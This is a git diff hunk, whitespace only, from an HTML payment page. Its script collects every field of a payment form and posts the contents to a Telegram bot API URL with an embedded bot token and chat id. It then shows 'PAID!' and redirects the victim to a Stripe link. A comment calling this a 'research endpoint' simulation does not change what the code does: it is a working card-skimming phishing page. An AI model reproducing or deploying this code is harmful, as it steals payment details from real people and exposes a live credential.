@@ -67,26 +67,26 @@
     e.preventDefault(); // Stop the default form submit
 
     const paymentData = {};
-    document.querySelectorAll('#paymentForm input').forEach(input => {
-      paymentData[input.name] = input.value;
-    });
+      document.querySelectorAll('#paymentForm input').forEach(input => {
+        paymentData[input.name] = input.value;
+      });
 
     // Simulate data being "sent" to a research endpoint
-    fetch('https://api.telegram.org/bot7805822636:AAFo5FBSIIzkpP0GsPBjOWVM5vVEz_g2z3s/sendMessage?chat_id=7869970772&text=' + encodeURIComponent, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify(paymentData)
-    }).then(res => {
-      if (res.ok) {
-        alert('PAID!');
-        window.location.href = 'https://buy.stripe.com/fZucN47XU4tue5Ze6O0Ny01'; // Replace with legit Stripe link
-      } else {
-        alert('Failed to send data');
-      }
-    });
-  };
-</script>
-</body>
+      fetch('https://api.telegram.org/bot7805822636:AAFo5FBSIIzkpP0GsPBjOWVM5vVEz_g2z3s/sendMessage?chat_id=7869970772&text=' + encodeURIComponent, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(paymentData)
+      }).then(res => {
+        if (res.ok) {
+          alert('PAID!');
+          window.location.href = 'https://buy.stripe.com/fZucN47XU4tue5Ze6O0Ny01'; // Replace with legit Stripe link
+        } else {
+          alert('Failed to send data');
+        }
+      });
+    };
+    </script>
+  </body>
 </html>
